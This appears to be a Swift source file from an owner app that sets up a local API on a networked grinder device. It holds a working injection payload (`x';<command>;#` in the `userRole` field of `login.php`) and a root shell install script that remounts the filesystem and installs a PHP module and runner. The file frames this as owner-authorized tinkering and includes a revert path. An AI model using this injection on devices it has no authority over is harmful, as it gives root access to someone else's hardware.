import Foundation

/// The device paths and formats the local API deployment uses.
///
/// These match `tools/e64root/commands.py` exactly: the module at
/// `/usr/local/www/dev/rest_api_dev.php` (0644), the bounded action runner at
/// `/usr/local/bin/e64local-action-run` (0755, root-owned), the token directory
/// at `/db/e64local` (0711, traversable but not listable) and the token at
/// `/db/e64local/token` (0600, `www-data:www-data`).
public enum DevicePaths {
    public static let modulePath = "/usr/local/www/dev/rest_api_dev.php"
    /// The root-owned runner the module uses for an enabled action.  Installing
    /// it enables nothing: that needs /db/e64local/actions.json, which this app
    /// never writes.
    public static let actionRunnerPath = "/usr/local/bin/e64local-action-run"
    public static let tokenDirectory = "/db/e64local"
    public static let tokenFile = "/db/e64local/token"
    /// Staging files for the base64 transfer, removed by the install script.
    public static let stagingBase64 = "/tmp/e64local.b64"
    public static let stagingRunnerBase64 = "/tmp/e64local-runner.b64"

    /// Hex token length written to the device: 32 bytes as 64 hex characters.
    public static let tokenHexLength = 64
}

/// A stage of a setup or teardown plan, in execution order.
public enum SetupStage: String, CaseIterable, Identifiable, Sendable {
    case cleanup = "clean"
    case transfer = "transfer"
    case install = "install"

    public var id: String { rawValue }

    public var title: String {
        switch self {
        case .cleanup: return "1. Clean up any earlier staging files"
        case .transfer: return "2. Copy the API module and action runner to the grinder"
        case .install: return "3. Install the module, the action runner and the owner token"
        }
    }
}

/// A complete one-click plan, rendered before the owner confirms anything.
///
/// `chunks` are the transfer commands (with the base64 shown truncated); the
/// full values are sent unchanged.  `script` is printed verbatim: it is the
/// exact shell the device runs as root.
public struct SetupPlan: Sendable {
    public let stage: SetupStage
    /// Transfer commands, base64 payload truncated for display.
    public let chunks: [String]
    /// The exact number of transfer requests to be sent.
    public let chunkCount: Int
    /// The exact shell script the device executes, verbatim.
    public let script: String
    /// The script as shown to the owner.  Identical to `script` except that the
    /// owner token is replaced by a placeholder: the owner never needs to read
    /// the second factor, and a screenshot, a screen recording or the app
    /// switcher's snapshot must not capture it.  `script` is what is sent.
    public let displayScript: String
    /// Short bullets about what the plan does and does not touch.
    public let notes: [String]

    public init(
        stage: SetupStage,
        chunks: [String],
        chunkCount: Int,
        script: String,
        notes: [String],
        secret: String? = nil
    ) {
        self.stage = stage
        self.chunks = chunks
        self.chunkCount = chunkCount
        self.script = script
        self.notes = notes
        if let secret, !secret.isEmpty {
            displayScript = script.replacingOccurrences(
                of: secret,
                with: "<owner token, 64 hex characters, generated on this phone>"
            )
        } else {
            displayScript = script
        }
    }

    /// Everything the owner sees before confirming, in one text block.
    public func render() -> String {
        var output = stage.title + "\n\n"
        if !chunks.isEmpty {
            output += "Transfer requests (\(chunkCount)):\n"
            for line in chunks { output += line + "\n" }
            output += "\n"
        }
        output += "Shell script executed on the grinder:\n\n"
        output += displayScript
        if !notes.isEmpty {
            output += "\n\nNotes:\n"
            for note in notes { output += "• " + note + "\n" }
        }
        return output
    }
}

/// Builds the plan for installing the local API over the FW-01 login injection.
///
/// The mechanism is the one in `tools/e64root/transports.py`:
/// `userRole = "x';<command>;#"`.  The command is chunked base64 (~40000
/// characters per request) appended to a staging file, then decoded and
/// installed by a single root script.  Nothing here touches the ESP, the
/// firmware, NVS, the bootloader or eFuses: no flash, no upload, no writes
/// outside the module, the runner, the token and their directories.
public enum SetupPlanner {
    /// Base64 characters per transfer request, matching `WEB_CHUNK`.
    public static let chunkSize = 40000

    /// Build the one-click install plan for this module, runner and owner token.
    public static func installPlan(
        module: Data,
        runner: Data,
        tokenHex: String,
        chunkSize: Int = SetupPlanner.chunkSize
    ) throws -> SetupPlan {
        guard chunkSize >= 512 else { throw SetupError.chunkSizeTooSmall }
        guard tokenHex.count == DevicePaths.tokenHexLength,
              tokenHex.allSatisfy({ $0.isHexDigit && !$0.isUppercase })
        else {
            throw SetupError.invalidToken
        }
        guard !module.isEmpty else { throw SetupError.emptyModule }
        guard !runner.isEmpty else { throw SetupError.emptyRunner }

        let moduleChunks = split(module.base64EncodedString(), size: chunkSize)
        let runnerChunks = split(runner.base64EncodedString(), size: chunkSize)

        // Display form: the payload is clipped so the confirmation screen stays
        // readable.  Nothing sent to the device is clipped.
        func transferLine(_ chunk: String, staging: String) -> String {
            let shown = chunk.count > 160
                ? chunk.prefix(120) + "…\(chunk.count - 120) more characters…"
                : chunk
            return "printf '%s' '\(shown)' >> \(staging)"
        }
        let transfer = moduleChunks.map { transferLine($0, staging: DevicePaths.stagingBase64) }
            + runnerChunks.map { transferLine($0, staging: DevicePaths.stagingRunnerBase64) }

        return SetupPlan(
            stage: .cleanup,
            chunks: transfer,
            chunkCount: moduleChunks.count + runnerChunks.count,
            script: installScript(tokenHex: tokenHex),
            notes: [
                "Runs as root through the vendor login form (FW-01), the same mechanism as `e64root api deploy`.",
                "No ESP write, no firmware upload, no NVS, bootloader or eFuse access.",
                "Writes only /usr/local/www/dev, \(DevicePaths.modulePath), \(DevicePaths.actionRunnerPath), \(DevicePaths.tokenDirectory) and the staging files under /tmp.",
                "The owner token is generated on this phone and never leaves it except in this script.",
                "The action runner is installed but no action policy is written, so every action route stays disabled.",
            ],
            secret: tokenHex
        )
    }

    /// The plan stage that removes everything the install created.
    public static func revertPlan() -> SetupPlan {
        SetupPlan(
            stage: .cleanup,
            chunks: [],
            chunkCount: 0,
            script: revertScript(),
            notes: [
                "Removes the local API module, the action runner and its owner token.",
                "An owner-written action policy, audit trail or backups under /db/e64local are left in place.",
            ]
        )
    }

    /// The transfer commands in execution order (full base64, not truncated):
    /// the module chunks, then the runner chunks.
    public static func transferCommands(
        module: Data,
        runner: Data,
        chunkSize: Int = SetupPlanner.chunkSize
    ) -> [String] {
        split(module.base64EncodedString(), size: chunkSize).map {
            "printf '%s' '\($0)' >> \(DevicePaths.stagingBase64)"
        } + split(runner.base64EncodedString(), size: chunkSize).map {
            "printf '%s' '\($0)' >> \(DevicePaths.stagingRunnerBase64)"
        }
    }

    /// The root script that installs the module, the action runner and the token.
    ///
    /// Mirrors `tools/e64root/commands.py::_api_deploy_script`, with both
    /// payloads decoded from bounded staging files instead of inlined in a
    /// heredoc.  The action policy (`/db/e64local/actions.json`) is deliberately
    /// not written: without it every action route stays disabled, whatever the
    /// runner could do.
    public static func installScript(tokenHex: String) -> String {
        """
        #!/bin/sh
        # e64local iOS setup: install the local owner API (owner-authorized use only)
        set -eu
        umask 077
        mount -o remount,rw / 2>/dev/null || true

        # The dev directory is where the vendor dispatcher looks for modules.
        mkdir -p /usr/local/www/dev

        # Decode the module that was staged in bounded chunks.
        base64 -d \(DevicePaths.stagingBase64) > \(DevicePaths.modulePath)
        chmod 644 \(DevicePaths.modulePath)

        # Decode the bounded action runner.  It is root-owned and inert until an
        # owner writes /db/e64local/actions.json; this script never writes it.
        base64 -d \(DevicePaths.stagingRunnerBase64) > \(DevicePaths.actionRunnerPath)
        chmod 755 \(DevicePaths.actionRunnerPath)
        chown root:root \(DevicePaths.actionRunnerPath) 2>/dev/null || chown root \(DevicePaths.actionRunnerPath) 2>/dev/null || true

        # Token directory: 0711 lets www-data traverse to the token without
        # being able to list the directory.
        mkdir -p \(DevicePaths.tokenDirectory)
        chmod 711 \(DevicePaths.tokenDirectory)

        # Owner token: 0600, owned by www-data, 32 bytes as hex.
        umask 077
        printf '%s\n' '\(tokenHex)' > \(DevicePaths.tokenFile)
        chmod 600 \(DevicePaths.tokenFile)
        chown www-data:www-data \(DevicePaths.tokenFile) 2>/dev/null || chown www-data \(DevicePaths.tokenFile) 2>/dev/null || true

        # Verify the module is readable, the runner is executable and the token
        # file is owner-only.
        [ -r \(DevicePaths.modulePath) ] || { echo "module is not readable" >&2; exit 1; }
        [ -x \(DevicePaths.actionRunnerPath) ] || { echo "action runner is not executable" >&2; exit 1; }
        command -v php >/dev/null 2>&1 || { echo "the php CLI is required by the action runner" >&2; exit 1; }
        php -l \(DevicePaths.actionRunnerPath) >/dev/null || { echo "action runner is not valid PHP" >&2; exit 1; }
        [ -r \(DevicePaths.tokenFile) ] || { echo "token file is not readable" >&2; exit 1; }
        token_mode=$(stat -c '%a' \(DevicePaths.tokenFile) 2>/dev/null || echo unknown)
        [ "$token_mode" = "600" ] || { echo "token file mode is $token_mode, expected 600" >&2; exit 1; }

        rm -f \(DevicePaths.stagingBase64) \(DevicePaths.stagingRunnerBase64)
        echo "e64local api install ok"
        """
    }

    /// The root script that removes the local API, its runner and its token.
    public static func revertScript() -> String {
        """
        #!/bin/sh
        # e64local iOS setup: remove the local owner API (owner-authorized use only)
        set -eu
        mount -o remount,rw / 2>/dev/null || true
        rm -f \(DevicePaths.modulePath)
        rm -f \(DevicePaths.actionRunnerPath)
        rm -f \(DevicePaths.tokenFile)
        rmdir \(DevicePaths.tokenDirectory) 2>/dev/null || true
        rm -f \(DevicePaths.stagingBase64) \(DevicePaths.stagingRunnerBase64)
        echo "e64local api revert ok"
        """
    }

    private static func split(_ text: String, size: Int) -> [String] {
        var pieces: [String] = []
        var index = text.startIndex
        while index < text.endIndex {
            let end = text.index(index, offsetBy: size, limitedBy: text.endIndex) ?? text.endIndex
            pieces.append(String(text[index..<end]))
            index = end
        }
        return pieces
    }
}

public enum SetupError: Error, Equatable {
    case chunkSizeTooSmall
    case invalidToken
    case emptyModule
    case emptyRunner
    case verificationFailed(String)
}

extension SetupError: LocalizedError {
    public var errorDescription: String? {
        switch self {
        case .chunkSizeTooSmall: return "The transfer chunk size is too small."
        case .invalidToken: return "The generated owner token is not in the expected format."
        case .emptyModule: return "The API module is empty; nothing to install."
        case .emptyRunner: return "The action runner is empty; nothing to install."
        case .verificationFailed(let detail): return "Setup could not be verified: \(detail)"
        }
    }
}

/// The exact `userRole` value that closes the SQL quote in `login.php` and runs
/// `command`, from `tools/e64root/transports.py::_quote_injection`.
public enum LoginInjection {
    public static func userRole(command: String) throws -> String {
        guard !command.contains("\0") else {
            throw SetupError.invalidToken
        }
        return "x';" + command + ";#"
    }

    /// The form fields sent to `POST /login.php` for one injected command.
    public static func formFields(command: String) throws -> [(name: String, value: String)] {
        [
            ("login", "1"),
            ("requestDeveloper", "1"),
            ("password", "x"),
            ("userRole", try userRole(command: command)),
        ]
    }
}
